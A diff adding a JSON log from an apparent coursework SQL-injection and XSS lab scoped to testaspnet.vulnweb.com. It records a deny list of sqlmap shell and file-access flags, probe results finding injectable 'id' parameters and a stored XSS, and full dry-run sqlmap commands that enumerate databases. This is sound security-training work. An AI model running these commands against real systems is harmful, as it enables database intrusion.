@@ -1,0 +1,186 @@
+{
+  "generated_at": "2026-11-23T20:01:50.628868+00:00",
+  "scope": [
+    "testaspnet.vulnweb.com"
+  ],
+  "guardrails": {
+    "risk": {
+      "default": 2,
+      "min": 2,
+      "max": 3
+    },
+    "level": {
+      "default": 2,
+      "min": 2,
+      "max": 3
+    },
+    "forbidden_flags": [
+      "--all",
+      "--dump-all",
+      "--eval",
+      "--file-dest",
+      "--file-read",
+      "--file-write",
+      "--load-cookies",
+      "--os-cmd",
+      "--os-pwn",
+      "--os-shell",
+      "--os-smbrelay",
+      "--priv-esc",
+      "--reg-add",
+      "--reg-del",
+      "--reg-read",
+      "--sql-shell"
+    ]
+  },
+  "sqli": [
+    {
+      "script": "sqli_manual_probe.py",
+      "args": [
+        "--url",
+        "http://testaspnet.vulnweb.com/Comments.aspx?id=2",
+        "--param",
+        "id",
+        "--out",
+        "C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap\\manual_probe_id_Comments_aspx.json"
+      ],
+      "returncode": 0,
+      "stdout": "[sqli] target  : http://testaspnet.vulnweb.com/Comments.aspx?id=2\n[sqli] param   : id (original='2')\n[sqli] verdict : LIKELY INJECTABLE\n         - [high] error-based (query-breaking): single-quote injection collapsed response 47322 -> 0 bytes; the query breaks on a bare quote\n[sqli] evidence: C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap\\manual_probe_id_Comments_aspx.json"
+    },
+    {
+      "script": "sqli_manual_probe.py",
+      "args": [
+        "--url",
+        "http://testaspnet.vulnweb.com/ReadNews.aspx?id=3",
+        "--param",
+        "id",
+        "--out",
+        "C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap\\manual_probe_id_ReadNews_aspx.json"
+      ],
+      "returncode": 0,
+      "stdout": "[sqli] target  : http://testaspnet.vulnweb.com/ReadNews.aspx?id=3\n[sqli] param   : id (original='3')\n[sqli] verdict : LIKELY INJECTABLE\n         - [high] error-based (query-breaking): single-quote injection collapsed response 18048 -> 0 bytes; the query breaks on a bare quote\n[sqli] evidence: C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap\\manual_probe_id_ReadNews_aspx.json"
+    },
+    {
+      "script": "sqli_manual_probe.py",
+      "args": [
+        "--url",
+        "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads/def.html",
+        "--param",
+        "NewsAd",
+        "--out",
+        "C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap\\manual_probe_NewsAd_ReadNews_aspx.json"
+      ],
+      "returncode": 0,
+      "stdout": "[sqli] target  : http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads/def.html\n[sqli] param   : NewsAd (original='ads/def.html')\n[sqli] verdict : no clear signal\n[sqli] evidence: C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap\\manual_probe_NewsAd_ReadNews_aspx.json"
+    }
+  ],
+  "sqlmap": [
+    {
+      "url": "http://testaspnet.vulnweb.com/Comments.aspx?id=2",
+      "param": "id",
+      "argv": [
+        "C:\\Users\\Admin\\AppData\\Local\\Python\\pythoncore-3.14-64\\python.exe",
+        "C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\.tools\\sqlmap-pkg\\sqlmap\\sqlmap.py",
+        "-u",
+        "http://testaspnet.vulnweb.com/Comments.aspx?id=2",
+        "--level",
+        "2",
+        "--risk",
+        "2",
+        "--batch",
+        "--threads",
+        "2",
+        "--user-agent",
+        "sqli-xss-lab/1.0 (authorized coursework scan; +https://github.com/CharbelN/sqli-xss-lab)",
+        "--flush-session",
+        "--time-sec",
+        "5",
+        "--output-dir",
+        "C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap",
+        "-p",
+        "id",
+        "--banner",
+        "--current-db",
+        "--current-user",
+        "--is-dba",
+        "--dbs"
+      ],
+      "command": "C:\\Users\\Admin\\AppData\\Local\\Python\\pythoncore-3.14-64\\python.exe C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\.tools\\sqlmap-pkg\\sqlmap\\sqlmap.py -u http://testaspnet.vulnweb.com/Comments.aspx?id=2 --level 2 --risk 2 --batch --threads 2 --user-agent sqli-xss-lab/1.0 (authorized coursework scan; +https://github.com/CharbelN/sqli-xss-lab) --flush-session --time-sec 5 --output-dir C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap -p id --banner --current-db --current-user --is-dba --dbs",
+      "dry_run": true
+    },
+    {
+      "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=3",
+      "param": "id",
+      "argv": [
+        "C:\\Users\\Admin\\AppData\\Local\\Python\\pythoncore-3.14-64\\python.exe",
+        "C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\.tools\\sqlmap-pkg\\sqlmap\\sqlmap.py",
+        "-u",
+        "http://testaspnet.vulnweb.com/ReadNews.aspx?id=3",
+        "--level",
+        "2",
+        "--risk",
+        "2",
+        "--batch",
+        "--threads",
+        "2",
+        "--user-agent",
+        "sqli-xss-lab/1.0 (authorized coursework scan; +https://github.com/CharbelN/sqli-xss-lab)",
+        "--flush-session",
+        "--time-sec",
+        "5",
+        "--output-dir",
+        "C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap",
+        "-p",
+        "id",
+        "--banner",
+        "--current-db",
+        "--current-user",
+        "--is-dba",
+        "--dbs"
+      ],
+      "command": "C:\\Users\\Admin\\AppData\\Local\\Python\\pythoncore-3.14-64\\python.exe C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\.tools\\sqlmap-pkg\\sqlmap\\sqlmap.py -u http://testaspnet.vulnweb.com/ReadNews.aspx?id=3 --level 2 --risk 2 --batch --threads 2 --user-agent sqli-xss-lab/1.0 (authorized coursework scan; +https://github.com/CharbelN/sqli-xss-lab) --flush-session --time-sec 5 --output-dir C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap -p id --banner --current-db --current-user --is-dba --dbs",
+      "dry_run": true
+    },
+    {
+      "url": "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads/def.html",
+      "param": "NewsAd",
+      "argv": [
+        "C:\\Users\\Admin\\AppData\\Local\\Python\\pythoncore-3.14-64\\python.exe",
+        "C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\.tools\\sqlmap-pkg\\sqlmap\\sqlmap.py",
+        "-u",
+        "http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads/def.html",
+        "--level",
+        "2",
+        "--risk",
+        "2",
+        "--batch",
+        "--threads",
+        "2",
+        "--user-agent",
+        "sqli-xss-lab/1.0 (authorized coursework scan; +https://github.com/CharbelN/sqli-xss-lab)",
+        "--flush-session",
+        "--time-sec",
+        "5",
+        "--output-dir",
+        "C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap",
+        "-p",
+        "NewsAd",
+        "--banner",
+        "--current-db",
+        "--current-user",
+        "--is-dba",
+        "--dbs"
+      ],
+      "command": "C:\\Users\\Admin\\AppData\\Local\\Python\\pythoncore-3.14-64\\python.exe C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\.tools\\sqlmap-pkg\\sqlmap\\sqlmap.py -u http://testaspnet.vulnweb.com/ReadNews.aspx?id=2&NewsAd=ads/def.html --level 2 --risk 2 --batch --threads 2 --user-agent sqli-xss-lab/1.0 (authorized coursework scan; +https://github.com/CharbelN/sqli-xss-lab) --flush-session --time-sec 5 --output-dir C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\sqlmap -p NewsAd --banner --current-db --current-user --is-dba --dbs",
+      "dry_run": true
+    }
+  ],
+  "xss": [
+    {
+      "script": "xss_stored_probe.py",
+      "args": [],
+      "returncode": 0,
+      "stdout": "[xss-stored] target : http://testaspnet.vulnweb.com/Comments.aspx?id=1 (field tbComment)\n[xss-stored] canary : <zzxssa50ca9c4zz>\n[xss-stored] verdict: STORED XSS (comment persisted and rendered UNENCODED)\n[xss-stored] context: ...[redacted-ip]</strong>11/23/2026 8:02:09 PM</DIV><DIV class=\"CommentText\"><zzxssa50ca9c4zz></DIV></td>\n\n\t</tr>\n\n\t<t...\n[xss-stored] evidence: C:\\Users\\Admin\\Desktop\\cyberia\\sqli-xss-lab\\evidence\\xss\\stored_probe.json"
+    }
+  ]
+}
